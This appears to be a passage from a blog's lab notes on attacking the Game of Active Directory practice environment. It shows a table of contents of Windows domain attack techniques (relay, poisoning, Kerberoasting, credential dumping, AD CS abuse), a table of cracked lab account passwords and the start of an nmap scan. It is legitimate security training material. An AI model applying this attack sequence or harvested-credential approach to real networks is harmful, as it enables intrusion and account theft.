
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="noindex" />

  <!--  <link rel="manifest" href="/assets/site.webmanifest" crossorigin="use-credentials">-->

  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/stylesheet/style.min.css">

    <link id="dark-theme-style" rel="stylesheet" type="text/css"
          media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
    href="https://ojack69.github.io/jacks-corner/theme/stylesheet/dark-theme.min.css">

    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
          href="https://ojack69.github.io/jacks-corner/theme/pygments/monokai.min.css">
    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: light)"
          href="https://ojack69.github.io/jacks-corner/theme/pygments/emacs.min.css">


  <link rel="stylesheet"
        type="text/css"
        href="https://ojack69.github.io/jacks-corner/theme/stork/stork.css" />

  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/fontawesome.css">
  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/brands.css">
  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/solid.css">

        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/custom.css"> 
        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/zoom.css"> 
        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/collapsible-toc.css"> 
        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/goals.css"> 


      <script src="https://code.jquery.com/jquery-3.7.1.min.js" type="application/javascript"></script>
      <script src="https://cdn.jsdelivr.net/npm/dompurify@3.2.4/dist/purify.min.js" type="application/javascript"></script>
      <script src="https://ojack69.github.io/jacks-corner/js/collapsible-toc.js" type="application/javascript"></script>
      <script src="https://ojack69.github.io/jacks-corner/js/zoom.js" type="application/javascript"></script>
      <script src="https://ojack69.github.io/jacks-corner/js/app.js" type="application/javascript"></script>
      <script src="https://ojack69.github.io/jacks-corner/js/goals.js" type="application/javascript"></script>











 

<meta name="author" content="Jack69" />
<meta name="description" content="Status Recovered Passwords: User Password NORTH\robb.stark sexywolfy NORTH\samwell.tarly Heartsbane NORTH\jeor.mormont _L0ngCl@w_ NORTH\jon.snow iknownothing NORTH\brandon.stark iseedeadpeople NORTH\hodor hodor NORTH\arya.stark Needle NORTH\eddard.stark FightP3aceAndHonor! NORTH\catelyn.stark NORTH\sansa.stark NORTH\rickon.stark NORTH\sql_svcESSOS\sql_svc …" />
<meta name="keywords" content="">


  <meta property="og:site_name" content="Jack's Corner"/>
  <meta property="og:title" content="Game of Active Directory Notes"/>
  <meta property="og:description" content="Status Recovered Passwords: User Password NORTH\robb.stark sexywolfy NORTH\samwell.tarly Heartsbane NORTH\jeor.mormont _L0ngCl@w_ NORTH\jon.snow iknownothing NORTH\brandon.stark iseedeadpeople NORTH\hodor hodor NORTH\arya.stark Needle NORTH\eddard.stark FightP3aceAndHonor! NORTH\catelyn.stark NORTH\sansa.stark NORTH\rickon.stark NORTH\sql_svcESSOS\sql_svc …"/>
  <meta property="og:locale" content="en_US"/>
  <meta property="og:url" content="https://ojack69.github.io/jacks-corner/ad/goad.html"/>
  <meta property="og:type" content="article"/>
  <meta property="article:published_time" content="2025-02-01 00:00:00+01:00"/>
  <meta property="article:modified_time" content=""/>
  <meta property="article:author" content="https://ojack69.github.io/jacks-corner/author/jack69.html">
  <meta property="article:section" content="Active Directory"/>
  <meta property="og:image" content="">

  <title>Jack's Corner &ndash; Game of Active Directory Notes</title>


</head>
<body >

<aside>
  <div>
    <a href="https://ojack69.github.io/jacks-corner/">
      <img src="https://ojack69.github.io/jacks-corner/theme/img/profile.png" alt="Jack's Corner" title="Jack's Corner">
    </a>

    <h1>
      <a href="https://ojack69.github.io/jacks-corner/">Jack's Corner</a>
    </h1>


    <div class="stork">
        <input class="stork-input" type="text" autocomplete="off" name="q" data-stork="sitesearch" placeholder="Search..." onclick=""/>
      <div class="stork-output" data-stork="sitesearch-output"></div>
    </div>


    <ul class="social">
      <li>
        <a class="sc-htb"
           href="https://app.hackthebox.com/profile/177323"
           target="_blank">
          <i class="fa-brands fa-htb"></i>
        </a>
      </li>
      <li>
        <a class="sc-thm"
           href="https://tryhackme.com/p/jack69"
           target="_blank">
          <i class="fa-brands fa-thm"></i>
        </a>
      </li>
    </ul>
  </div>
</aside>
  <main>

<nav>
  <a href="https://ojack69.github.io/jacks-corner/">Home</a>

  <a href="https://ojack69.github.io/jacks-corner/categories.html">Categories</a>
  <a href="https://ojack69.github.io/jacks-corner/category/cheatsheet.html">Cheatsheets</a>
  <a href="https://ojack69.github.io/jacks-corner/personal/goals.html">Goals</a>


</nav>

<article class="single">
  <header>
      
    <h1 id="ad/goad">Game of Active Directory Notes</h1>
    <p>

    </p>
  </header>


  <div>
        <div class="toc col-lg-3 hidden-xs hidden-sm">
            <div id="toc"><ul><li><a class="toc-href" href="#status" title="Status">Status</a></li><li><a class="toc-href" href="#initial-enumeration" title="Initial Enumeration">Initial Enumeration</a></li><li><a class="toc-href" href="#initial-attacks" title="Initial Attacks">Initial Attacks</a><ul><li><a class="toc-href" href="#smb-relay" title="SMB Relay">SMB Relay</a></li><li><a class="toc-href" href="#llmnr-poisoning" title="LLMNR Poisoning">LLMNR Poisoning</a></li><li><a class="toc-href" href="#dns-takeover-via-ipv6" title="DNS takeover via IPv6">DNS takeover via IPv6</a></li><li><a class="toc-href" href="#plaintext-password" title="Plaintext Password">Plaintext Password</a></li><li><a class="toc-href" href="#password-spraying" title="Password Spraying">Password Spraying</a><ul><li><a class="toc-href" href="#winterfell" title="WINTERFELL">WINTERFELL</a></li><li><a class="toc-href" href="#kingslanding" title="KINGSLANDING">KINGSLANDING</a></li></ul></li></ul></li><li><a class="toc-href" href="#credentials-dumping_2" title="Credentials Dumping">Credentials Dumping</a><ul><li><a class="toc-href" href="#north" title="NORTH">NORTH</a><ul><li><a class="toc-href" href="#donpapi" title="DonPAPI">DonPAPI</a></li><li><a class="toc-href" href="#mimikatz" title="Mimikatz">Mimikatz</a></li></ul></li><li><a class="toc-href" href="#kingslanding_2" title="KINGSLANDING">KINGSLANDING</a></li></ul></li><li><a class="toc-href" href="#shares-enumeration_1" title="Shares Enumeration">Shares Enumeration</a></li><li><a class="toc-href" href="#roasting" title="Roasting">Roasting</a><ul><li><a class="toc-href" href="#kerberoasting" title="Kerberoasting">Kerberoasting</a></li><li><a class="toc-href" href="#as-rep-roasting" title="AS-REP Roasting">AS-REP Roasting</a><ul><li><a class="toc-href" href="#northsevenkingdomslocal" title="NORTH.SEVENKINGDOMS.LOCAL">NORTH.SEVENKINGDOMS.LOCAL</a></li><li><a class="toc-href" href="#essoslocal" title="ESSOS.local">ESSOS.local</a></li></ul></li></ul></li><li><a class="toc-href" href="#delegation-attacks_2" title="Delegation Attacks">Delegation Attacks</a><ul><li><a class="toc-href" href="#unconstrained-delegation" title="Unconstrained Delegation">Unconstrained Delegation</a></li><li><a class="toc-href" href="#constrained-delegation" title="Constrained Delegation">Constrained Delegation</a><ul><li><a class="toc-href" href="#alternative-1" title="Alternative 1">Alternative 1</a></li><li><a class="toc-href" href="#alternative-2" title="Alternative 2">Alternative 2</a></li></ul></li><li><a class="toc-href" href="#resource-based-constrained-delegation_1" title="Resource-based constrained delegation">Resource-based constrained delegation</a></li></ul></li><li><a class="toc-href" href="#lateral-movement_1" title="Lateral Movement">Lateral Movement</a><ul><li><a class="toc-href" href="#golden-ticket" title="Golden Ticket">Golden Ticket</a><ul><li><a class="toc-href" href="#child-domain-to-parent" title="Child domain to parent">Child domain to parent</a></li></ul></li><li><a class="toc-href" href="#samaccountname-nopac_1" title="sAMAccountName (nopac)">sAMAccountName (nopac)</a><ul><li><a class="toc-href" href="#manually" title="Manually">Manually</a></li><li><a class="toc-href" href="#automatically" title="Automatically">Automatically</a></li></ul></li><li><a class="toc-href" href="#printnightmare_1" title="PrintNightmare">PrintNightmare</a></li></ul></li><li><a class="toc-href" href="#mssql-abuse_1" title="MSSQL Abuse">MSSQL Abuse</a><ul><li><a class="toc-href" href="#abuse-impersonate-privileges-as-login" title="Abuse impersonate privileges: as Login">Abuse impersonate privileges: as Login</a></li><li><a class="toc-href" href="#abuse-impersonate-privileges-as-user" title="Abuse impersonate privileges: as user">Abuse impersonate privileges: as user</a></li><li><a class="toc-href" href="#abuse-links-trusts" title="Abuse links trusts">Abuse links trusts</a></li><li><a class="toc-href" href="#mssql-relay" title="MSSQL Relay">MSSQL Relay</a></li></ul></li><li><a class="toc-href" href="#ad-cs_1" title="AD CS">AD CS</a><ul><li><a class="toc-href" href="#esc1" title="ESC1">ESC1</a></li><li><a class="toc-href" href="#esc2-esc3" title="ESC2 + ESC3">ESC2 + ESC3</a></li><li><a class="toc-href" href="#esc4" title="ESC4">ESC4</a></li><li><a class="toc-href" href="#esc6" title="ESC6">ESC6</a></li><li><a class="toc-href" href="#esc8" title="ESC8">ESC8</a></li><li><a class="toc-href" href="#shadow-credentials" title="Shadow Credentials">Shadow Credentials</a><ul><li><a class="toc-href" href="#user-account" title="User Account">User Account</a></li><li><a class="toc-href" href="#computer-account" title="Computer Account">Computer Account</a></li></ul></li><li><a class="toc-href" href="#certifried_1" title="Certifried">Certifried</a></li></ul></li><li><a class="toc-href" href="#acl-abuses_1" title="ACL Abuses">ACL Abuses</a><ul><li><a class="toc-href" href="#gpo-abuse" title="GPO Abuse">GPO Abuse</a></li><li><a class="toc-href" href="#laps-password" title="LAPS Password">LAPS Password</a></li><li><a class="toc-href" href="#targeted-kerberoast" title="Targeted Kerberoast">Targeted Kerberoast</a></li><li><a class="toc-href" href="#force-change-password" title="Force Change Password">Force Change Password</a></li><li><a class="toc-href" href="#acl-chain-1" title="ACL Chain 1">ACL Chain 1</a></li><li><a class="toc-href" href="#acl-chain-2" title="ACL Chain 2">ACL Chain 2</a></li><li><a class="toc-href" href="#genericwrite-profilepath" title="GenericWrite - profilePath">GenericWrite - profilePath</a></li></ul></li></ul></div>
        </div>
    <h2 id="status">Status</h2>
<p>Recovered Passwords:</p>
<table>
<thead>
<tr>
<th>User</th>
<th>Password</th>
</tr>
</thead>
<tbody>
<tr>
<td>NORTH\robb.stark</td>
<td>sexywolfy</td>
</tr>
<tr>
<td>NORTH\samwell.tarly</td>
<td>Heartsbane</td>
</tr>
<tr>
<td>NORTH\jeor.mormont</td>
<td>_L0ngCl@w_</td>
</tr>
<tr>
<td>NORTH\jon.snow</td>
<td>iknownothing</td>
</tr>
<tr>
<td>NORTH\brandon.stark</td>
<td>iseedeadpeople</td>
</tr>
<tr>
<td>NORTH\hodor</td>
<td>hodor</td>
</tr>
<tr>
<td>NORTH\arya.stark</td>
<td>Needle</td>
</tr>
<tr>
<td>NORTH\eddard.stark</td>
<td>FightP3aceAndHonor!</td>
</tr>
<tr>
<td>NORTH\catelyn.stark</td>
<td></td>
</tr>
<tr>
<td>NORTH\sansa.stark</td>
<td></td>
</tr>
<tr>
<td>NORTH\rickon.stark</td>
<td></td>
</tr>
<tr>
<td>NORTH\sql_svc<br/>ESSOS\sql_svc</td>
<td>YouWillNotKerboroast1ngMeeeeee</td>
</tr>
<tr>
<td>SEVENKINGDOMS\cersei.lannister</td>
<td>il0vejaime</td>
</tr>
<tr>
<td>SEVENKINGDOMS\robert.baratheon</td>
<td>iamthekingoftheworld</td>
</tr>
<tr>
<td>SEVENKINGDOMS\petyer.baelish</td>
<td>@littlefinger@</td>
</tr>
<tr>
<td>SEVENKINGDOMS\joffrey.baratheon</td>
<td>1killerlion</td>
</tr>
<tr>
<td>SEVENKINGDOMS\tywin.lannister</td>
<td>powerkingftw135</td>
</tr>
<tr>
<td>SEVENKINGDOMS\jaime.lannister</td>
<td>password123 (ForceChangePassword)</td>
</tr>
<tr>
<td>ESSOS.local\missandei</td>
<td>fr3edom</td>
</tr>
<tr>
<td>ESSOS.local\khal.drogo</td>
<td>horse</td>
</tr>
<tr>
<td>ESSOS.local\viserys.targaryen</td>
<td>password123 (ForceChangePassword)</td>
</tr>
</tbody>
</table>
<h2 id="initial-enumeration">Initial Enumeration</h2>
<div class="highlight"><pre><span></span><code><span class="err">#</span><span class="w"> </span><span class="nx">Nmap</span><span class="w"> </span><span class="m m-Double">7.95</span><span class="w"> </span><span class="nx">scan</span><span class="w"> </span><span class="nx">initiated</span><span class="w"> </span><span class="nx">Tue</span><span class="w"> </span><span class="nx">Jan</span><span class="w"> </span><span class="mi">28</span><span class="w"> </span><span class="mi">09</span><span class="p">:</span><span class="mi">36</span><span class="p">:</span><span class="mi">12</span><span class="w"> </span><span class="mi">2025</span><span class="w"> </span><span class="k">as</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">lib</span><span class="o">/</span><span class="nx">nmap</span><span class="o">/</span><span class="nx">nmap</span><span class="w"> </span><span class="o">-</span><span class="nx">sC</span><span class="w"> </span><span class="o">-</span><span class="nx">sV</span><span class="w"> </span><span class="o">-</span><span class="nx">iL</span><span class="w"> </span><span class="nx">targets</span><span class="p">.</span><span class="nx">txt</span><span class="w"> </span><span class="o">-</span><span class="nx">oN</span><span class="w"> </span><span class="nx">common</span><span class="o">-</span><span class="nx">port</span><span class="o">-</span><span class="nx">scanning</span><span class="p">.</span><span class="nx">nmap</span>
<span class="w">    </span><span class="nx">Nmap</span><span class="w"> </span><span class="nx">scan</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m m-Double">10.1.0.10</span>
<span class="w">    </span><span class="nx">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="nx">up</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">0.00020</span><span class="nx">s</span><span class="w"> </span><span class="nx">latency</span><span class="p">).</span>
<span class="w">    </span><span class="nx">Not</span><span class="w"> </span><span class="nx">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">985</span><span class="w"> </span><span class="nx">closed</span><span class="w"> </span><span class="nx">tcp</span><span class="w"> </span><span class="nx">ports</span><span class="w"> </span><span class="p">(</span><span class="nx">reset</span><span class="p">)</span>
<span class="w">    </span><span class="nx">PORT</span><span class="w">     </span><span class="nx">STATE</span><span class="w"> </span><span class="nx">SERVICE</span><span class="w">       </span><span class="nx">VERSION</span>
<span class="w">    </span><span class="mi">53</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">open</span><span class="w">  </span><span class="nx">domain</span><span class="w">        </span><span class="nx">Simple</span><span class="w"> </span><span class="nx">DNS</span><span class="w"> </span><span class="nx">Plus</span>
<span class="w">    </span><span class="mi">80</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">open</span><span class="w">  </span><span class="nx">http</span><span class="w">          </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">IIS</span><span class="w"> </span><span class="nx">httpd</span><span class="w"> </span><span class="m m-Double">10.0</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">http</span><span class="o">-</span><span class="nx">methods</span><span class="p">:</span><span class="w"> </span>
<span class="w">    </span><span class="o">|</span><span class="nx">_</span><span class="w">  </span><span class="nx">Potentially</span><span class="w"> </span><span class="nx">risky</span><span class="w"> </span><span class="nx">methods</span><span class="p">:</span><span class="w"> </span><span class="nx">TRACE</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">title</span><span class="p">:</span><span class="w"> </span><span class="nx">IIS</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Server</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">server</span><span class="o">-</span><span class="nx">header</span><span class="p">:</span><span class="w"> </span><span class="nx">Microsoft</span><span class="o">-</span><span class="nx">IIS</span><span class="o">/</span><span class="m m-Double">10.0</span>
<span class="w">    </span><span class="mi">88</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">open</span><span class="w">  </span><span class="nx">kerberos</span><span class="o">-</span><span class="nx">sec</span><span class="w">  </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Kerberos</span><span class="w"> </span><span class="p">(</span><span class="nx">server</span><span class="w"> </span><span class="nx">time</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">28</span><span class="w"> </span><span class="mi">09</span><span class="p">:</span><span class="mi">36</span><span class="p">:</span><span class="mi">26</span><span class="nx">Z</span><span class="p">)</span>
<span class="w">    </span><span class="mi">135</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">msrpc</span><span class="w">         </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">RPC</span>
<span class="w">    </span><span class="mi">139</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">netbios</span><span class="o">-</span><span class="nx">ssn</span><span class="w">   </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">netbios</span><span class="o">-</span><span class="nx">ssn</span>
<span class="w">    </span><span class="mi">389</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">ldap</span><span class="w">          </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Active</span><span class="w"> </span><span class="nx">Directory</span><span class="w"> </span><span class="nx">LDAP</span><span class="w"> </span><span class="p">(</span><span class="nx">Domain</span><span class="p">:</span><span class="w"> </span><span class="nx">sevenkingdoms</span><span class="p">.</span><span class="nx">local0</span><span class="p">.,</span><span class="w"> </span><span class="nx">Site</span><span class="p">:</span><span class="w"> </span><span class="nx">Default</span><span class="o">-</span><span class="nx">First</span><span class="o">-</span><span class="nx">Site</span><span class="o">-</span><span class="nx">Name</span><span class="p">)</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">ssl</span><span class="o">-</span><span class="nx">cert</span><span class="p">:</span><span class="w"> </span><span class="nx">Subject</span><span class="p">:</span><span class="w"> </span><span class="nx">commonName</span><span class="p">=</span><span class="nx">kingslanding</span><span class="p">.</span><span class="nx">sevenkingdoms</span><span class="p">.</span><span class="nx">local</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">Subject</span><span class="w"> </span><span class="nx">Alternative</span><span class="w"> </span><span class="nx">Name</span><span class="p">:</span><span class="w"> </span><span class="nx">othername</span><span class="p">:</span><span class="w"> </span><span class="m m-Double">1.3.6.1.4.1.311.25.1</span><span class="p">:&lt;</span><span class="nx">unsupported</span><span class="p">&gt;,</span><span class="w"> </span><span class="nx">DNS</span><span class="p">:</span><span class="nx">kingslanding</span><span class="p">.</span><span class="nx">sevenkingdoms</span><span class="p">.</span><span class="nx">local</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2024</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">19</span><span class="nx">T20</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">32</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2025</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">19</span><span class="nx">T20</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">32</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_ssl</span><span class="o">-</span><span class="nx">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">28</span><span class="nx">T09</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">34</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span><span class="w"> </span><span class="mi">0</span><span class="nx">s</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">scanner</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span>
<span class="w">    </span><span class="mi">445</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">microsoft</span><span class="o">-</span><span class="nx">ds</span><span class="p">?</span>
<span class="w">    </span><span class="mi">464</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">kpasswd5</span><span class="p">?</span>
<span class="w">    </span><span class="mi">593</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">ncacn_http</span><span class="w">    </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">RPC</span><span class="w"> </span><span class="nx">over</span><span class="w"> </span><span class="nx">HTTP</span><span class="w"> </span><span class="m m-Double">1.0</span>
<span class="w">    </span><span class="mi">636</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">ssl</span><span class="o">/</span><span class="nx">ldap</span><span class="w">      </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Active</span><span class="w"> </span><span class="nx">Directory</span><span class="w"> </span><span class="nx">LDAP</span><span class="w"> </span><span class="p">(</span><span class="nx">Domain</span><span class="p">:</span><span class="w"> </span><span class="nx">sevenkingdoms</span><span class="p">.</span><span class="nx">local0</span><span class="p">.,</span><span class="w"> </span><span class="nx">Site</span><span class="p">:</span><span class="w"> </span><span class="nx">Default</span><span class="o">-</span><span class="nx">First</span><span class="o">-</span><span class="nx">Site</span><span class="o">-</span><span class="nx">Name</span><span class="p">)</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">ssl</span><span class="o">-</span><span class="nx">cert</span><span class="p">:</span><span class="w"> </span><span class="nx">Subject</span><span class="p">:</span><span class="w"> </span><span class="nx">commonName</span><span class="p">=</span><span class="nx">kingslanding</span><span class="p">.</span><span class="nx">sevenkingdoms</span><span class="p">.</span><span class="nx">local</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">Subject</span><span class="w"> </span><span class="nx">Alternative</span><span class="w"> </span><span class="nx">Name</span><span class="p">:</span><span class="w"> </span><span class="nx">othername</span><span class="p">:</span><span class="w"> </span><span class="m m-Double">1.3.6.1.4.1.311.25.1</span><span class="p">:&lt;</span><span class="nx">unsupported</span><span class="p">&gt;,</span><span class="w"> </span><span class="nx">DNS</span><span class="p">:</span><span class="nx">kingslanding</span><span class="p">.</span><span class="nx">sevenkingdoms</span><span class="p">.</span><span class="nx">local</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2024</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">19</span><span class="nx">T20</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">32</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2025</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">19</span><span class="nx">T20</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">32</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_ssl</span><span class="o">-</span><span class="nx">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">28</span><span class="nx">T09</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">34</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span><span class="w"> </span><span class="mi">0</span><span class="nx">s</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">scanner</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span>
<span class="w">    </span><span class="mi">3268</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">ldap</span><span class="w">          </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Active</span><span class="w"> </span><span class="nx">Directory</span><span class="w"> </span><span class="nx">LDAP</span><span class="w"> </span><span class="p">(</span><span class="nx">Domain</span><span class="p">:</span><span class="w"> </span><span class="nx">sevenkingdoms</span><span class="p">.</span><span class="nx">local0</span><span class="p">.,</span><span class="w"> </span><span class="nx">Site</span><span class="p">:</span><span class="w"> </span><span class="nx">Default</span><span class="o">-</span><span class="nx">First</span><span class="o">-</span><span class="nx">Site</span><span class="o">-</span><span class="nx">Name</span><span class="p">)</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">ssl</span><span class="o">-</span><span class="nx">cert</span><span class="p">:</span><span class="w"> </span><span class="nx">Subject</span><span class="p">:</span><span class="w"> </span><span class="nx">commonName</span><span class="p">=</span><span class="nx">kingslanding</span><span class="p">.</span><span class="nx">sevenkingdoms</span><span class="p">.</span><span class="nx">local</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">Subject</span><span class="w"> </span><span class="nx">Alternative</span><span class="w"> </span><span class="nx">Name</span><span class="p">:</span><span class="w"> </span><span class="nx">othername</span><span class="p">:</span><span class="w"> </span><span class="m m-Double">1.3.6.1.4.1.311.25.1</span><span class="p">:&lt;</span><span class="nx">unsupported</span><span class="p">&gt;,</span><span class="w"> </span><span class="nx">DNS</span><span class="p">:</span><span class="nx">kingslanding</span><span class="p">.</span><span class="nx">sevenkingdoms</span><span class="p">.</span><span class="nx">local</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2024</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">19</span><span class="nx">T20</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">32</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2025</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">19</span><span class="nx">T20</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">32</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_ssl</span><span class="o">-</span><span class="nx">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">28</span><span class="nx">T09</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">34</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span><span class="w"> </span><span class="mi">0</span><span class="nx">s</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">scanner</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span>
<span class="w">    </span><span class="mi">3269</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">ssl</span><span class="o">/</span><span class="nx">ldap</span><span class="w">      </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Active</span><span class="w"> </span><span class="nx">Directory</span><span class="w"> </span><span class="nx">LDAP</span><span class="w"> </span><span class="p">(</span><span class="nx">Domain</span><span class="p">:</span><span class="w"> </span><span class="nx">sevenkingdoms</span><span class="p">.</span><span class="nx">local0</span><span class="p">.,</span><span class="w"> </span><span class="nx">Site</span><span class="p">:</span><span class="w"> </span><span class="nx">Default</span><span class="o">-</span><span class="nx">First</span><span class="o">-</span><span class="nx">Site</span><span class="o">-</span><span class="nx">Name</span><span class="p">)</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">ssl</span><span class="o">-</span><span class="nx">cert</span><span class="p">:</span><span class="w"> </span><span class="nx">Subject</span><span class="p">:</span><span class="w"> </span><span class="nx">commonName</span><span class="p">=</span><span class="nx">kingslanding</span><span class="p">.</span><span class="nx">sevenkingdoms</span><span class="p">.</span><span class="nx">local</span>
